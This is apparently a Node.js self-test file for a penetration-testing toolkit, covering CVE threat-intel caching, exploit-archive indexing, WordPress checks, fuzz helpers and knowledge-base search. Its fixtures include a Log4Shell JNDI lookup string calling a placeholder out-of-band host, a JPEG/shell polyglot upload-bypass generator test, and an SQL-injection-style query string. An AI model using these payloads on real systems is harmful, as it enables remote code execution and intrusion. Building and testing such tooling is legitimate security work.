#!/usr/bin/env node
// Self-checks for the repo-vet churchofmalware integrations (plan QW1..QW10):
// threatintel (NVD/KEV/EPSS cache), vendor-mirror (verify/list-zip/index-poc),
// searchsploit poc_archive merge, wp-check gating, polyglot generator, stavros fuzz/noauth
// helpers, test-registry wiring, kb-search FTS5 retrieval.
// Run: node tools/test-repo-vet.js   (fully offline: fetch + paths injectable)
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');

const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'stavros-rv-'));
process.on('exit', () => { try { fs.rmSync(TMP, { recursive: true, force: true }); } catch {} });
const tmpFile = (...names) => path.join(TMP, ...names);

(async () => {
  // ---------- QW1: threatintel ----------
  const TI = require('./threatintel');
  {
    const cacheDir = tmpFile('ti-cache');
    const nvdBody = {
      vulnerabilities: [{
        cve: {
          id: 'CVE-2021-44228',
          published: '2021-12-10T10:15:09.143',
          lastModified: '2026-08-11T19:33:44.513',
          descriptions: [{ lang: 'en', value: 'Apache Log4j2 JNDI RCE' }, { lang: 'es', value: 'ignored' }],
          weaknesses: [{ description: [{ lang: 'en', value: 'CWE-502' }, { lang: 'en', value: 'CWE-917' }] }],
          metrics: { cvssMetricV31: [{ type: 'Primary', cvssData: { baseScore: 10, vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H' } }] },
          references: [{ url: 'https://nvd.example/r1' }, { url: 'https://nvd.example/r2' }],
        },
      }],
    };
    const kevBody = { dateReleased: '2026-01-01', count: 2, vulnerabilities: [
      { cveID: 'CVE-2021-44228', dateAdded: '2021-12-10', dueDate: '2021-12-24', knownRansomwareCampaignUse: 'Known', product: 'Log4j', shortDescription: 'x' },
      { cveID: 'CVE-2017-0144', dateAdded: '2017-05-12', knownRansomwareCampaignUse: 'Unknown', product: 'SMB', shortDescription: 'y' },
    ] };
    let kevFetches = 0;
    const fetch = async (url) => {
      const u = String(url);
      if (u.startsWith(TI.NVD_API)) return { ok: true, json: async () => nvdBody };
      if (u.startsWith(TI.EPSS_API)) {
        const cve = decodeURIComponent(u.split('cve=')[1]);
        return { ok: true, json: async () => ({ data: [{ cve, epss: '0.9757', percentile: '0.9999' }] }) };
      }
      if (u === TI.KEV_URL) { kevFetches++; return { ok: true, json: async () => kevBody }; }
      return { ok: false, json: async () => ({}) };
    };

    const r = await TI.refreshCve('CVE-2021-44228', { fetch, cacheDir });
    assert.strictEqual(r.cve, 'CVE-2021-44228');
    assert.strictEqual(r.nvd.cwes[0], 'CWE-502');
    assert.strictEqual(r.nvd.cvss, 10);
    assert.strictEqual(r.epss.epss, 0.9757);
    assert.strictEqual(r.kev.date_added, '2021-12-10');

    // batch refresh reuses ONE KEV catalog fetch
    await TI.refreshAll(['CVE-2021-44228', 'CVE-9999-00001'], { fetch, cacheDir });
    assert.ok(kevFetches <= 3, 'KEV memoized per batch');

    const intel = TI.lookupCached('CVE-2021-44228', { cacheDir });
    assert.strictEqual(intel.kev, true);
    assert.strictEqual(intel.epss, 0.9757);
    assert.ok(intel.cwes.includes('CWE-917'));
    assert.ok(intel.refs.length >= 1);

    // meaningful negative from a present catalog
    const neg = TI.lookupCached('CVE-9999-00001', { cacheDir });
    assert.ok(neg && neg.kev === false, 'CVE absent from a PRESENT catalog must yield kev:false, not unknown');

    // totally uncached CVE -> null, never fabricated
    assert.strictEqual(TI.lookupCached('CVE-2013-1337', { cacheDir }), null);

    // fetch failures degrade; old cache untouched
    const rr = await TI.refreshCve('CVE-2013-1337', { fetch: async () => { throw new Error('offline'); }, cacheDir });
    assert.strictEqual(rr.nvd, null);
    assert.strictEqual(rr.epss, null);
    assert.strictEqual(rr.kev, null);
    assert.strictEqual(TI.lookupCached('CVE-2021-44228', { cacheDir }).kev, true);
  }

  // record-finding integration via the warmed cache (sync path)
  {
    process.env.FINDINGS_JSONL = tmpFile('findings.jsonl');
    process.env.LOOT_JSONL = tmpFile('loot.jsonl');
    process.env.FINDINGS_TAB_DB = tmpFile('tab.db');   // never touch the real session store
    process.env.TI_CACHE_DIR = tmpFile('ti-cache');    // warmed above
    const RF = require('./record-finding');
    const res = RF.record(JSON.stringify({
      severity: 'High', title: 'RCE via log4j lookup', host: 'lab.local', endpoint: '/api/log', status: 'inconclusive',
      poc: '${jndi:ldap://oob/lab}', cves: ['CVE-2021-44228'],
    }));
    assert.strictEqual(res.ok, true, res.error);
    const row = JSON.parse(fs.readFileSync(process.env.FINDINGS_JSONL, 'utf8').trim());
    assert.strictEqual(row.kev, true);
    assert.strictEqual(row.kev_date_added, '2021-12-10');
    assert.strictEqual(row.cwe, 'CWE-502');
    assert.strictEqual(row.epss_source, 'first-epss-api');
    delete process.env.TI_CACHE_DIR;
  }

  // ---------- QW2: vendor-mirror ----------
  const VM = require('./vendor-mirror');
  const pocIndexFile = (() => {
    function cdEntry(name) {
      const nb = Buffer.from(name, 'utf8');
      const h = Buffer.alloc(46);
      h.writeUInt32LE(0x02014b50, 0);
      h.writeUInt16LE(20, 4); h.writeUInt16LE(20, 6);
      h.writeUInt32LE(nb.length, 20);
      h.writeUInt16LE(nb.length, 28);
      return Buffer.concat([h, nb]);
    }
    function eocd(cdStart, cdSize, n) {
      const b = Buffer.alloc(22);
      b.writeUInt32LE(0x06054b50, 0);
      b.writeUInt16LE(n, 10); b.writeUInt16LE(n, 12);
      b.writeUInt32LE(cdSize, 12);
      b.writeUInt32LE(cdStart, 16);
      return b;
    }
    const names = ['poc-archive/CVE-2020-1234/readme.md', 'poc-archive/CVE-2020-1234/exploit.py', 'docs/index.html'];
    const cds = Buffer.concat(names.map(cdEntry));
    const prefix = Buffer.from('PK\x03\x04fake-local-area');
    return Buffer.concat([prefix, cds, eocd(prefix.length, cds.length, names.length)]);
  })();

  {
    const listed = VM.listZipNames(pocIndexFile);
    assert.deepStrictEqual(listed, ['poc-archive/CVE-2020-1234/readme.md', 'poc-archive/CVE-2020-1234/exploit.py', 'docs/index.html']);
    assert.deepStrictEqual(VM.listZipNames(Buffer.from('garbage')), []);
    assert.deepStrictEqual(VM.listZipNames(Buffer.alloc(0)), []);

    const mirrorRoot = tmpFile('mirror');
    const repoDir = path.join(mirrorRoot, 'CVE-Exploits-Archive');
    fs.mkdirSync(repoDir, { recursive: true });
    fs.writeFileSync(path.join(repoDir, 'a'.repeat(40) + '.zip'), pocIndexFile);
    const idx = VM.indexPoc({ root: mirrorRoot, indexFile: tmpFile('poc-archive-index.json'), repos: ['X/CVE-Exploits-Archive'] });
    assert.strictEqual(idx.archives, 1);
    assert.ok(idx.indexed_paths >= 2);

    const hits = VM.queryPocIndex('CVE-2020-1234', tmpFile('poc-archive-index.json'));
    assert.ok(hits.length >= 2, JSON.stringify(hits));
    assert.strictEqual(hits[0].sha256, VM.sha256(pocIndexFile));
    assert.ok(VM.queryPocIndex('readme', tmpFile('poc-archive-index.json')).length >= 1);
    assert.strictEqual(VM.queryPocIndex('zzz-nothing', tmpFile('poc-archive-index.json')).length, 0);
  }

  // searchsploit merges the PoC archive as second local source (injectable index)
  {
    const S = require('./searchsploit');
    const sample = JSON.stringify({ SEARCH: 'CVE-2020-1234', RESULTS_EXPLOIT: [], RESULTS_SHELLCODE: [] });
    const res = S.lookup('CVE-2020-1234', { exec: () => ({ stdout: sample, status: 0 }), pocIndexFile: tmpFile('poc-archive-index.json') });
    assert.strictEqual(res.ok, true);
    assert.ok(res.poc_archive.length >= 2, 'poc_archive merged from index');
    const res2 = S.lookup('CVE-2020-1234', { exec: () => ({ stdout: sample, status: 0 }), pocIndexFile: tmpFile('does-not-exist.json') });
    assert.deepStrictEqual(res2.poc_archive, [], 'missing index degrades gracefully');
  }

  // ---------- QW3: wp-check ----------
  const WP = require('./wp-check');
  {
    assert.strictEqual(WP.versionInRange('7.0.1', '6.9', '7.0.1'), true);
    assert.strictEqual(WP.versionInRange('7.0.2', '6.9', '7.0.1'), false);
    assert.strictEqual(WP.versionInRange('6.8', '6.9', '7.0.1'), false);
    assert.strictEqual(WP.versionInRange('banana', '6.9', '7.0.1'), false);
    assert.strictEqual(WP.extractVersion('<meta name="generator" content="WordPress 7.0.1 - https://wordpress.org/">', 'home').version, '7.0.1');

    const scope = { allowed_hosts: ['wp.local'], allowed_url_prefixes: [], allowed_ips: [] };
    const html = '<meta name="generator" content="WordPress 6.9.5"><link href="/wp-includes/js/x">';
    const fetch = async (url) => ({
      ok: true, status: 200,
      text: async () => (String(url).includes('/wp-json/') ? '{"routes":{"/wp/v2/posts":{}}}' : html),
    });
    const r = await WP.check('http://wp.local', { fetch, scope });
    assert.strictEqual(r.wordpress.version, '6.9.5');
    assert.strictEqual(r.wordpress.rest_enabled, true);
    assert.deepStrictEqual(r.cves, ['CVE-2026-63030', 'CVE-2026-60137']);
    assert.strictEqual(r.checks[0].applicable, true);

    const blocked = await WP.check('http://out.example', { fetch, scope });
    assert.strictEqual(blocked.blocked, true);
  }

  // ---------- QW4: polyglot ----------
  {
    const P = require('./payloads/upload-bypass/gen-polyglot-jpeg');
    const checks = P.selfTest();
    assert.ok(checks.every((c) => c.magic_ok && c.eoi_before_script && c.marker_present && c.shebang_or_comment), JSON.stringify(checks));
    const g = P.generate({ mode: 'sh', marker: 'RVTEST' });
    assert.strictEqual(g.buffer[0], 0xff); assert.strictEqual(g.buffer[1], 0xd8); assert.strictEqual(g.buffer[2], 0xff);
    assert.ok(g.buffer.toString('latin1').includes('echo RVTEST'));
    assert.strictEqual(g.buffer.toString('latin1').includes('#!/bin/sh'), true);
  }

  // ---------- QW5/QW6: stavros helpers ----------
  {
    process.env.STAVROS_NOAUTH_FINDER = tmpFile('nf.py');
    fs.writeFileSync(process.env.STAVROS_NOAUTH_FINDER, '#!/usr/bin/env python3\n');
    const S = require('./stavros');
    assert.strictEqual(S.resolveOperatorTool('STAVROS_NOAUTH_FINDER', 'noauth_finder/x.py'), tmpFile('nf.py'));
    assert.strictEqual(S.resolveOperatorTool('STAVROS_MISSING_ENV', 'missing/x.py', { noVendorDefaults: true }), null);
    const cmd = S.noauthCommand('/opt/nf.py', '10.1.2.3');
    assert.deepStrictEqual(cmd.args, ['/opt/nf.py', '10.1.2.3', '--allow-public']);
    const urls = S.parseDiscoveredUrls('see http://h.local:9000/a, http://h.local:9000/b.');
    assert.deepStrictEqual(urls, ['http://h.local:9000/a', 'http://h.local:9000/b']);
    const jobs = S.buildFuzzJobs([
      { host: 'h', port: 443, protocol: 'tcp', service: 'https' },
      { host: 'h', port: 161, protocol: 'udp', service: 'snmp' },
      { host: 'h', port: 22, protocol: 'tcp', service: 'ssh' },
    ], { script: '/a/apt++.py', outRoot: '/o' });
    assert.deepStrictEqual(jobs.map((j) => j.mode), ['http', 'udp', 'tcp']);
    assert.strictEqual(jobs[0].args[jobs[0].args.indexOf('-H') + 1], 'h');
    assert.ok(jobs.every((j) => j.args.includes('--allow-public') === false));
  }

  // ---------- QW7: registry wiring ----------
  {
    const M = require('./map');
    const refs = M.refsFor('idor');
    assert.strictEqual(refs.wstg[0], 'WSTG-ATHZ-04');
    assert.strictEqual(refs.owasp_api[0], 'API1');
    assert.strictEqual(M.refsFor('no-such-class'), null);
    const RF = require('./record-finding');
    assert.ok(RF.registryClasses().includes('idor'));
    assert.strictEqual(String(RF.validate({ severity: 'High', title: 't', host: 'h', poc: 'p', class: 'bogus' })).startsWith('unknown class'), true);
    const st = RF.standardsFor({ cwe: 'CWE-89' });
    assert.strictEqual(st.class, 'sqli');
    assert.deepStrictEqual(st.wstg, ['WSTG-INPV-05']);
    assert.strictEqual(RF.standardsFor({ class: 'idor', standards: { class: 'custom' } }).class, 'custom', 'operator-provided standards win');
  }

  // ---------- QW10: kb-search ----------
  {
    const KB = require('./kb-search');
    const md = '# T\nintro text\n## Alpha\nalpha body\n### Beta\nbeta body\n';
    assert.deepStrictEqual(KB.chunksOf(md).map((c) => c.heading), ['(preamble)', 'Alpha', 'Beta']);
    // FTS syntax in user input must not become query syntax
    const dbFile = tmpFile('kb-test.db');
    const idxRes = KB.index({ includeReports: false, dbFile });
    assert.strictEqual(idxRes.ok, true);
    assert.ok(idxRes.chunks_indexed > 0);
    const hits = KB.search('stage gate report', { dbFile, limit: 3 });
    assert.strictEqual(hits.ok, true, JSON.stringify(hits));
    assert.ok(hits.matches.length >= 1);
    const weird = KB.search('scope" OR 1=1 --', { dbFile });
    assert.strictEqual(weird.ok === true || /query failed/.test(weird.error || ''), true);
    assert.strictEqual(KB.search('', { dbFile }).ok, false);
    assert.strictEqual(KB.search('anything', { dbFile: tmpFile('nope.db') }).error, 'index missing — run: node tools/kb-search.js index');
  }

  console.log('repo-vet integrations: all tests passed');
})().catch((e) => {
  console.error(e);
  process.exit(1);
});
